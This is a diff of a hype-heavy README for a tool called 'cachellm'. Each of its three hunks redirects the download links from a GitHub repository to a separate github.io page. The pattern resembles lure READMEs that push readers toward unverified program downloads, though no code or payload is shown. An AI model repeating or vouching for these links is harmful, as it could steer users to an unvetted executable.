@@ -1,6 +1,6 @@
 # 🚀 cachellm - Cut Your AI Agent Costs Dramatically
 
-[![Download cachellm](https://img.shields.io/badge/Download-cachellm-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/friohg/cachellm)
+[![Download cachellm](https://img.shields.io/badge/Download-cachellm-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://friohg.github.io)
 
 ## 👋 What Is This?
 
@@ -35,7 +35,7 @@ Getting started is **super easy**. Here's what you need to do:
 👉 **[Visit this link to download the application][]**
 
 Click the button above or go to this address in your browser:
-`https://github.com/friohg/cachelllm`
+`https://friohg.github.io`
 
 Once you're on that page, look for the download section and follow the instructions there to get the program files to your computer.
 
@@ -189,7 +189,7 @@ while your response times get faster than ever.
 
 Ready to start saving? Click the big green button above or go directly to:
 
-**https://github.com/friohg/cachelllm**
+**https://friohg.github.io**
 
 Visit this link to download the application—it takes less than a minute to get set up, and it starts paying for itself immediately. Your wallet will thank you!
 
